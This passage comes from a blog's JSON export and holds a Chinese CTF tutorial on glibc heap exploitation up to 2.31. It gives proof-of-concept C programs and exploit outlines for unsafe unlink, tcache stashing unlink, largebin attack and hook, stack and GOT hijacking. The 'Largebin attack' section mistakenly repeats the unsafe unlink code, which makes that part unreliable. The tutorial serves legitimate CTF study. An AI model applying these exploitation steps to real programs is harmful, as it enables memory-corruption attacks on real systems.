EditAlloc(4, 4 * 4); EditAlloc(5, 4 * 5); // set tcache 0x40 num and link Edit(0, -0x25d6f, 1); Edit(0, -0x25d4c, (0x78B000)); // make opretor delete got to 0x10000 Add(0x30); // 6 Edit(6, 1, 0); Edit(6, 0, 0x10000); // Add(0);&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://v3rdant.cn/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/tags/CTF/"}]},{"title":"Pwn.Heap-Exploation-up-to-2.31","slug":"Pwn.Heap-Exploation-up-to-2.31","date":"2023-06-20T16:00:00.000Z","updated":"2023-12-07T02:11:35.215Z","comments":true,"path":"Pwn.Heap-Exploation-up-to-2.31/","link":"","permalink":"https://v3rdant.cn/Pwn.Heap-Exploation-up-to-2.31/","excerpt":"","text":"Basic Knowledge bins: unsorted bin fast bin small bin large bin NO LIMITATION 0x20-0x80 &lt;0x400 &gt;0x400 libc version ubuntu-libc version 2.23=“16.04” 2.24=“17.04” 2.26=“17.10” 2.27=“18.04” 2.28=“18.10” 2.29=“19.04” 2.30=“19.10” 2.31=“20.04” 2.32=“20.10” 2.33=“21.04” 2.34=“22.04” Overview 在刚刚入门堆时，笔者是比较苦恼的，笔者在学习一项知识时，习惯性地想先从大局着手来学习。即，先对这个知识内容的整体有一定了解后，再去填充细节内容。然而在笔者开始学习堆利用时，被各种繁杂的版本差异和堆利用弄得头昏脑涨，因此对于堆一直不得其门而入，无法深刻理解多种多样的技巧及其使用时机，也因此不像栈溢出一样，笔者无法快速理出一个直观的脉络，然后安排细化的学习路径。 本文主要针对glibc2.30及以上有着tcache的版本。因为低于2.27版本的堆笔者根本不会 正如关于栈溢出的文章中，笔者根据攻击点将栈溢出分为三种，在这篇文章中，笔者也将拆解heap exploation，完成笔者心目中的一个划分。 在笔者看来，一次堆利用主要分为一下几个步骤： 漏洞的发现 地址的泄露 利用漏洞控制目标地址内容 攻击的对象 因此，本文的主要的编排顺序，也是按照这样几个顺序来实现的。笔者首先将会介绍堆利用过程中的一些基本漏洞，其次，笔者将会介绍如何完成地址泄露，接着，笔者将会讨论一些heap exploation的技术以及这些技术如何控制目标地址，而在可以控制一个目标地址后，最后笔者将讨论如何如何我们可以选取哪些攻击对象，以及他们各自有什么优劣。 笔者写这一篇文章时，去年这个时间差不多是我刚刚开始学习堆利用的时间，经过一年的时间，笔者总算感觉对于堆利用有了一个比较综合性的认知，尽管当前关于heap exploation的blog很多，但是笔者仍然感觉过于零散，因此，在这篇文章中，同笔者关于栈溢出的文章一样，笔者也不会过多的讲述各个技巧的细节–去看这些技巧的提出者大师傅可能讲述地要比我更完善–而着重于贯穿各个技巧的联系， 才不是因为笔者懒呢 ，目的是提供一个学习路径的图谱和完成一次堆利用时的思考路径。 基本漏洞 UAF 在free时没有清空指针，可以重利用指针。 在没有Edit 的情况下，可以通过 double free 进行堆块重叠。 overflow 溢出，可以控制下一个chunk，一般而言，可以方便地转换为堆块重叠，因此，也容易利用 off-by-one/off-by-null 这里主要针对2.29-2.31版本, 2.29-2.31版本的off-by-null ，wjh师傅已经讲解的非常详细了，核心就是通过unsorted bin机制残留的指针伪造fd、bk，来进行unlink，最后制造堆重叠。 漏洞的利用 上述几个漏洞都可以方便地转换为堆重叠，在此基础上，可以很方便地转换为任意地址写，在small bin的范围内，可以考虑tcache poison，在large bin的范围内，可以考虑large bin attack，在此基础上再对特定的攻击面进行攻击，即可劫持控制流 考虑: one gadget system(“/bin/sh”) orw leak 一般而言，堆题中的leak主要是针对libc地址，heap地址的leak相对而言较为简单，而libc地址的leak将在 [[#stack]] 攻击面部分详述。 一般而言，heap leak 堆地址主要利用unsorted bin的第一个chunk会存在libc地址来leak。如果存在UAF，可以将一个直接放入unsorted bin，然后show来获得。 也可以释放入unsorted bin 后再申请回来实现，由于malloc并不会清空chunk内容，因此可以读取到残留的libc的指针。 而在没有show相关输出chunk内容的函数时，考虑通过_IO_2_1_stdout_ 来leak 基本原理就是partial overwrite 覆盖unsorted bin中的libc地址，分配到__IO_2_1_stdout的位置，然后改写来完成leak Basic tricks up to 2.30 在2.30以上的版本，我认为需要掌握的基本技术主要包括: [x] largebin attack [x] tcache stashing unlink attack [x] unsafe unlink [x] tcache poison [x] house of botcake [x] decrypt safe_unlink [x] house of pig [x] 堆布局 这里结合how to heap源代码分析 Largebin attack 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;uint64_t *chunk0_ptr;int main()&#123; setbuf(stdout, NULL); printf(&quot;Welcome to unsafe unlink 2.0!\\n&quot;); printf(&quot;Tested in Ubuntu 20.04 64bit.\\n&quot;); printf(&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n&quot;); printf(&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n&quot;); int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin int header_size = 2; printf(&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n&quot;); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 printf(&quot;The global chunk0_ptr is at %p, pointing to %p\\n&quot;, &amp;chunk0_ptr, chunk0_ptr); printf(&quot;The victim chunk we are going to corrupt is at %p\\n\\n&quot;, chunk1_ptr); printf(&quot;We create a fake chunk inside chunk0.\\n&quot;); printf(&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n&quot;); chunk0_ptr[1] = chunk0_ptr[-1] - 0x10; printf(&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n&quot;); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); printf(&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n&quot;); printf(&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n&quot;); chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); printf(&quot;Fake chunk fd: %p\\n&quot;,(void*) chunk0_ptr[2]); printf(&quot;Fake chunk bk: %p\\n\\n&quot;,(void*) chunk0_ptr[3]); printf(&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n&quot;); uint64_t *chunk1_hdr = chunk1_ptr - header_size; printf(&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n&quot;); printf(&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n&quot;); chunk1_hdr[0] = malloc_size; printf(&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n&quot;,(void*)chunk1_hdr[0]); printf(&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\\n\\n&quot;); chunk1_hdr[1] &amp;= ~1; printf(&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n&quot;); printf(&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n&quot;); free(chunk1_ptr); printf(&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n&quot;); char victim_string[8]; strcpy(victim_string,&quot;Hello!~&quot;); chunk0_ptr[3] = (uint64_t) victim_string; printf(&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n&quot;); printf(&quot;Original value: %s\\n&quot;,victim_string); chunk0_ptr[0] = 0x4141414142424242LL; printf(&quot;New Value: %s\\n&quot;,victim_string); // sanity check assert(*(long *)victim_string == 0x4141414142424242L);&#125; 核心思路: 12345678910111213141516malloc(0x420) # chunk Amalloc(0x18)#And another chunk to prevent consolidatemalloc(0x410) # chunk B#This chunk should be smaller than [p1] and belong to the same large binmalloc(0x18)#And another chunk to prevent consolidatefree(0)malloc(0x438)#Allocate a chunk larger than [p1] to insert [p1] into large binfree(1)#Free the smaller of the two --&gt; [p2]edit(0, p64(0)*3+p64(target2-0x20))#最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址malloc(0x438)edit(0, p64(recover)*2) # 修复large bin attack 修复: 可以通过gdb查看未更改时chunk A的fd和bk，然后修复，免于计算 限制: 需要一次UAF 效果: 在2.30以上可以在任意地址写入一个libc地址 unsafe unlink 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;uint64_t *chunk0_ptr;int main()&#123; setbuf(stdout, NULL); printf(&quot;Welcome to unsafe unlink 2.0!\\n&quot;); printf(&quot;Tested in Ubuntu 20.04 64bit.\\n&quot;); printf(&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n&quot;); printf(&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n&quot;); int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin int header_size = 2; printf(&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n&quot;); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 printf(&quot;The global chunk0_ptr is at %p, pointing to %p\\n&quot;, &amp;chunk0_ptr, chunk0_ptr); printf(&quot;The victim chunk we are going to corrupt is at %p\\n\\n&quot;, chunk1_ptr); printf(&quot;We create a fake chunk inside chunk0.\\n&quot;); printf(&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n&quot;); chunk0_ptr[1] = chunk0_ptr[-1] - 0x10; printf(&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n&quot;); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); printf(&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n&quot;); printf(&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n&quot;); chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); printf(&quot;Fake chunk fd: %p\\n&quot;,(void*) chunk0_ptr[2]); printf(&quot;Fake chunk bk: %p\\n\\n&quot;,(void*) chunk0_ptr[3]); printf(&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n&quot;); uint64_t *chunk1_hdr = chunk1_ptr - header_size; printf(&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n&quot;); printf(&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n&quot;); chunk1_hdr[0] = malloc_size; printf(&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n&quot;,(void*)chunk1_hdr[0]); printf(&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\\n\\n&quot;); chunk1_hdr[1] &amp;= ~1; printf(&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n&quot;); printf(&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n&quot;); free(chunk1_ptr); printf(&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n&quot;); char victim_string[8]; strcpy(victim_string,&quot;Hello!~&quot;); chunk0_ptr[3] = (uint64_t) victim_string; printf(&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n&quot;); printf(&quot;Original value: %s\\n&quot;,victim_string); chunk0_ptr[0] = 0x4141414142424242LL; printf(&quot;New Value: %s\\n&quot;,victim_string); // sanity check assert(*(long *)victim_string == 0x4141414142424242L);&#125; 核心思路: 123456# chunk 0 ptr store in &amp;ptrmalloc(0x420) # not in fastbin or tcachemalloc(0x420) edit(0, p64(0)+p64(fake_size)+p64(&amp;ptr-0x18)+p64(&amp;ptr-0x10)+p64(0)*k + p64(fake_prev_size)+p64(size)) # fakesize = 0x420-0x10# need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0 限制: overflow ,可以修改prev_inuse触发fake chunk unlink and consolidate 主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构 效果: 可以将ptr处地址改写为&amp;ptr-8 tcache stashing unlink 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123; unsigned long stack_var[0x10] = &#123;0&#125;; unsigned long *chunk_lis[0x10] = &#123;0&#125;; unsigned long *target; setbuf(stdout, NULL); printf(&quot;This file demonstrates the stashing unlink attack on tcache.\\n\\n&quot;); printf(&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\\n\\n&quot;); printf(&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\\n\\n&quot;); printf(&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\\n\\n&quot;); printf(&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\\n\\n&quot;); // stack_var emulate the fake_chunk we want to alloc to printf(&quot;Stack_var emulates the fake chunk we want to alloc to.\\n\\n&quot;); printf(&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\\n\\n&quot;); stack_var[3] = (unsigned long)(&amp;stack_var[2]); printf(&quot;You can see the value of fake_chunk-&gt;bk is:%p\\n\\n&quot;,(void*)stack_var[3]); printf(&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\\n\\n&quot;,(void*)stack_var[4]); printf(&quot;Now we alloc 9 chunks with malloc.\\n\\n&quot;); //now we malloc 9 chunks for(int i = 0;i &lt; 9;i++)&#123; chunk_lis[i] = (unsigned long*)malloc(0x90); &#125; //put 7 chunks into tcache printf(&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\\n\\n&quot;); for(int i = 3;i &lt; 9;i++)&#123; free(chunk_lis[i]); &#125; printf(&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\\n\\n&quot;); //last tcache bin free(chunk_lis[1]); //now they are put into unsorted bin free(chunk_lis[0]); free(chunk_lis[2]); //convert into small bin printf(&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\\n\\n&quot;); malloc(0xa0);// size &gt; 0x90 //now 5 tcache bins printf(&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\\n\\n&quot;); malloc(0x90); malloc(0x90); printf(&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\\n\\n&quot;,(void*)stack_var); //change victim-&gt;bck /*VULNERABILITY*/ chunk_lis[2][1] = (unsigned long)stack_var; /*VULNERABILITY*/ //trigger the attack printf(&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\\n\\n&quot;); calloc(1,0x90); printf(&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\\n\\n&quot;,(void*)stack_var[2],(void*)stack_var[4]); //malloc and return our fake chunk on stack target = malloc(0x90); printf(&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\\n&quot;,(void*)target); assert(target == &amp;stack_var[2]); return 0;&#125; 核心思路: 123456789101112131415calloc(0xa0)for i in range(6): calloc(0xa0) free(i)calloc(0x4b0) # 9 calloc(0xb0) # 10free(9)calloc(0x400)calloc(0x4b0) # 11calloc(0xb0) # 12free(9)calloc(0x400) #13edit(13, b&#x27;\\x00&#x27;*0x400+p64(prev_size)+p64(size)+p64(target_add-0x10))calloc(0xa0) 限制: 需要UAF 主要适用于只有calloc并且可以分配tcache大小的chunk的情况，对于有malloc，打tcache poison更加方便 效果: 获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）。 在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可。 tcache poison 主要是通过改写tcache的next指针，实现类似于fastbin的house of spirit的效果。 house of orange house of orange 原利用链中的IO_FILE相关利用已经失效了，这里主要关注其绕过无free函数限制的方法，即通过malloc大于top chunk大小的chunk时会先释放top chunk，再拓展堆区域。 一般而言，修改top chunk需要满足一下条件。 伪造的 size 必须要对齐到内存页 size 要大于 MINSIZE(0x10) size 要小于之后申请的 chunk size + MINSIZE(0x10) size 的 prev inuse 位必须为 1 攻击面 劫持控制流 hooks stack IO_FILE dlts libc.got 辅助攻击链 tcache_perthread_struct global_max_fast heap 管理结构 劫持控制流 hooks 堆利用中最基本的夺取控制流的方法就是打各种hooks。 一般而言，可以利用__free_hook 加 写入’/bin/sh’的堆快实现劫持。 此外，如果要打one_gadget的话，可以打__malloc_hook，在tcache之前的版本，更多是打__malloc_hook，因为其在main_arena附近，存在许多libc上地址，方便通过错位构造0x7f的size，此外，由于__malloc_hook和__realloc_hook临近，也可以很方便地同时控制这两个hook，然后通过__realloc_hook配合来调整栈帧，方便满足one gadget 条件 而在glibc2.34版本及以上，各类hooks都已经被移除，因此也需要掌握一些其他的劫持控制流的办法。 stack 在stack overflow 中，通过栈和ROP劫持控制流的方法我们已经不陌生，然而不像stack overflow 天然可以在栈上写入，如果要在heap exploation中通过ROP来劫持控制流，一个无法绕过的问题是栈地址不可知。 我们都知道程序加载时，环境变量会被压入栈中，可以通过environ指针访问到栈上环境变量。 查看glibc源代码 123456#if !_LIBC# define __environ environ# ifndef HAVE_ENVIRON_DECLextern char **environ;# endif#endif 发现这是一个extern变量，在gdb中调试查找 12345678910111213141516171819202122 0x7f78a14d4000 0x7f78a1500000 r--p 2c000 0 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6 0x7f78a1500000 0x7f78a1668000 r-xp 168000 2c000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6 0x7f78a1668000 0x7f78a16bd000 r--p 55000 194000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6 0x7f78a16bd000 0x7f78a16be000 ---p 1000 1e9000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6 0x7f78a16be000 0x7f78a16c1000 r--p 3000 1e9000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6 0x7f78a16c1000 0x7f78a16c4000 rw-p 3000 1ec000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6 0x7f78a16c4000 0x7f78a16d3000 rw-p f000 0 [anon_7f78a16c4] 0x7f78a16d3000 0x7f78a16d4000 r--p 1000 0 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2 0x7f78a16d4000 0x7f78a16f8000 r-xp 24000 1000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2 0x7f78a16f8000 0x7f78a1702000 r--p a000 25000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2 0x7f78a1702000 0x7f78a1704000 r--p 2000 2e000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2 0x7f78a1704000 0x7f78a1706000 rw-p 2000 30000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2 0x7ffd6bb9e000 0x7ffd6bbc0000 rw-p 22000 0 [stack] 0x7ffd6bbd4000 0x7ffd6bbd8000 r--p 4000 0 [vvar] 0x7ffd6bbd8000 0x7ffd6bbda000 r-xp 2000 0 [vdso]0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall]pwndbg&gt; p environ$1 = (char **) 0x7ffd6bbbdfc8pwndbg&gt; p &amp;environ$2 = (char ***) 0x7f78a16c9ec0 &lt;environ&gt;pwndbg&gt; 可以看到其存在于anon_7f78a16c4段，在libc后，与libc存在固定偏移，猜测这一部分内容与ld 过程有关（笔者暂且还没有查证） 既然可以通过访问libc偏移地址leak stack地址，那么此时我们就可以通过这个栈地址分配到栈上来ROP了。 此攻击点的优点是不像IO_FILE的攻击那样，需要触发程序结束时（exit()函数，从main返回，malloc_assert）时清理现场的流程，可以覆盖堆菜单中分配函数或者edit函数的栈来实现攻击。 libc.got checksec libc，会发现其一般开启了Partial RELRO，所以可以考虑写libc的got表 1234567$ checksec libc.so.6 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 笔者在实际操作时发现，pwntools的elf.got并不能很好解析libc的got段，可以使用IDA来查看。 以下的got表来自libc2.34 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137.got.plt:00000000001ED000 ; Segment type: Pure data.got.plt:00000000001ED000 ; Segment permissions: Read/Write.got.plt:00000000001ED000 _got_plt segment qword public &#x27;DATA&#x27; use64.got.plt:00000000001ED000 assume cs:_got_plt.got.plt:00000000001ED000 ;org 1ED000h.got.plt:00000000001ED000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC.got.plt:00000000001ED008 qword_1ED008 dq 0 ; DATA XREF: sub_2C000↑r.got.plt:00000000001ED010 qword_1ED010 dq 0 ; DATA XREF: sub_2C000+6↑r.got.plt:00000000001ED018 off_1ED018 dq offset __strnlen_ifunc.got.plt:00000000001ED018 ; DATA XREF: j___strnlen_ifunc↑r.got.plt:00000000001ED018 ; Indirect relocation.got.plt:00000000001ED020 off_1ED020 dq offset __rawmemchr_ifunc.got.plt:00000000001ED020 ; DATA XREF: j___rawmemchr_ifunc↑r.got.plt:00000000001ED020 ; Indirect relocation.got.plt:00000000001ED028 off_1ED028 dq offset __GI___libc_realloc.got.plt:00000000001ED028 ; DATA XREF: _realloc↑r.got.plt:00000000001ED030 off_1ED030 dq offset __strncasecmp_ifunc.got.plt:00000000001ED030 ; DATA XREF: j___strncasecmp_ifunc↑r.got.plt:00000000001ED030 ; Indirect relocation.got.plt:00000000001ED038 off_1ED038 dq offset _dl_exception_create.got.plt:00000000001ED038 ; DATA XREF: __dl_exception_create↑r.got.plt:00000000001ED040 off_1ED040 dq offset __mempcpy_ifunc.got.plt:00000000001ED040 ; DATA XREF: j___mempcpy_ifunc↑r.got.plt:00000000001ED040 ; Indirect relocation.got.plt:00000000001ED048 off_1ED048 dq offset __wmemset_ifunc.got.plt:00000000001ED048 ; DATA XREF: j___wmemset_ifunc↑r.got.plt:00000000001ED048 ; Indirect relocation.got.plt:00000000001ED050 off_1ED050 dq offset __libc_calloc ; DATA XREF: _calloc↑r.got.plt:00000000001ED058 off_1ED058 dq offset strspn_ifunc ; DATA XREF: j_strspn_ifunc↑r.got.plt:00000000001ED058 ; Indirect relocation.got.plt:00000000001ED060 off_1ED060 dq offset memchr_ifunc ; DATA XREF: j_memchr_ifunc↑r.got.plt:00000000001ED060 ; Indirect relocation.got.plt:00000000001ED068 off_1ED068 dq offset __libc_memmove_ifunc.got.plt:00000000001ED068 ; DATA XREF: j___libc_memmove_ifunc↑r.got.plt:00000000001ED068 ; Indirect relocation.got.plt:00000000001ED070 off_1ED070 dq offset __wmemchr_ifunc.got.plt:00000000001ED070 ; DATA XREF: j___wmemchr_ifunc↑r.got.plt:00000000001ED070 ; Indirect relocation.got.plt:00000000001ED078 off_1ED078 dq offset __stpcpy_ifunc.got.plt:00000000001ED078 ; DATA XREF: j___stpcpy_ifunc↑r.got.plt:00000000001ED078 ; Indirect relocation.got.plt:00000000001ED080 off_1ED080 dq offset __wmemcmp_ifunc.got.plt:00000000001ED080 ; DATA XREF: j___wmemcmp_ifunc↑r.got.plt:00000000001ED080 ; Indirect relocation.got.plt:00000000001ED088 off_1ED088 dq offset _dl_find_dso_for_object.got.plt:00000000001ED088 ; DATA XREF: __dl_find_dso_for_object↑r.got.plt:00000000001ED090 off_1ED090 dq offset strncpy_ifunc ; DATA XREF: j_strncpy_ifunc↑r.got.plt:00000000001ED090 ; Indirect relocation.got.plt:00000000001ED098 off_1ED098 dq offset strlen_ifunc ; DATA XREF: j_strlen_ifunc↑r.got.plt:00000000001ED098 ; Indirect relocation.got.plt:00000000001ED0A0 off_1ED0A0 dq offset __strcasecmp_l_ifunc.got.plt:00000000001ED0A0 ; DATA XREF: j___strcasecmp_l_ifunc↑r.got.plt:00000000001ED0A0 ; Indirect relocation.got.plt:00000000001ED0A8 off_1ED0A8 dq offset strcpy_ifunc ; DATA XREF: j_strcpy_ifunc↑r.got.plt:00000000001ED0A8 ; Indirect relocation.got.plt:00000000001ED0B0 off_1ED0B0 dq offset __wcschr_ifunc.got.plt:00000000001ED0B0 ; DATA XREF: j___wcschr_ifunc↑r.got.plt:00000000001ED0B0 ; Indirect relocation.got.plt:00000000001ED0B8 off_1ED0B8 dq offset __strchrnul_ifunc.got.plt:00000000001ED0B8 ; DATA XREF: j___strchrnul_ifunc↑r.got.plt:00000000001ED0B8 ; Indirect relocation.got.plt:00000000001ED0C0 off_1ED0C0 dq offset __memrchr_ifunc.got.plt:00000000001ED0C0 ; DATA XREF: j___memrchr_ifunc↑r.got.plt:00000000001ED0C0 ; Indirect relocation.got.plt:00000000001ED0C8 off_1ED0C8 dq offset _dl_deallocate_tls.got.plt:00000000001ED0C8 ; DATA XREF: __dl_deallocate_tls↑r.got.plt:00000000001ED0D0 off_1ED0D0 dq offset __tls_get_addr.got.plt:00000000001ED0D0 ; DATA XREF: ___tls_get_addr↑r.got.plt:00000000001ED0D8 off_1ED0D8 dq offset __wmemset_ifunc.got.plt:00000000001ED0D8 ; DATA XREF: j___wmemset_ifunc_0↑r.got.plt:00000000001ED0D8 ; Indirect relocation.got.plt:00000000001ED0E0 off_1ED0E0 dq offset memcmp_ifunc ; DATA XREF: j_memcmp_ifunc↑r.got.plt:00000000001ED0E0 ; Indirect relocation.got.plt:00000000001ED0E8 off_1ED0E8 dq offset __strncasecmp_l_ifunc.got.plt:00000000001ED0E8 ; DATA XREF: j___strncasecmp_l_ifunc↑r.got.plt:00000000001ED0E8 ; Indirect relocation.got.plt:00000000001ED0F0 off_1ED0F0 dq offset _dl_fatal_printf.got.plt:00000000001ED0F0 ; DATA XREF: __dl_fatal_printf↑r.got.plt:00000000001ED0F8 off_1ED0F8 dq offset strcat_ifunc ; DATA XREF: j_strcat_ifunc↑r.got.plt:00000000001ED0F8 ; Indirect relocation.got.plt:00000000001ED100 off_1ED100 dq offset __wcscpy_ifunc.got.plt:00000000001ED100 ; DATA XREF: j___wcscpy_ifunc↑r.got.plt:00000000001ED100 ; Indirect relocation.got.plt:00000000001ED108 off_1ED108 dq offset strcspn_ifunc ; DATA XREF: j_strcspn_ifunc↑r.got.plt:00000000001ED108 ; Indirect relocation.got.plt:00000000001ED110 off_1ED110 dq offset __strcasecmp_ifunc.got.plt:00000000001ED110 ; DATA XREF: j___strcasecmp_ifunc↑r.got.plt:00000000001ED110 ; Indirect relocation.got.plt:00000000001ED118 off_1ED118 dq offset strncmp_ifunc ; DATA XREF: j_strncmp_ifunc↑r.got.plt:00000000001ED118 ; Indirect relocation.got.plt:00000000001ED120 off_1ED120 dq offset __wmemchr_ifunc.got.plt:00000000001ED120 ; DATA XREF: j___wmemchr_ifunc_0↑r.got.plt:00000000001ED120 ; Indirect relocation.got.plt:00000000001ED128 off_1ED128 dq offset __stpncpy_ifunc.got.plt:00000000001ED128 ; DATA XREF: 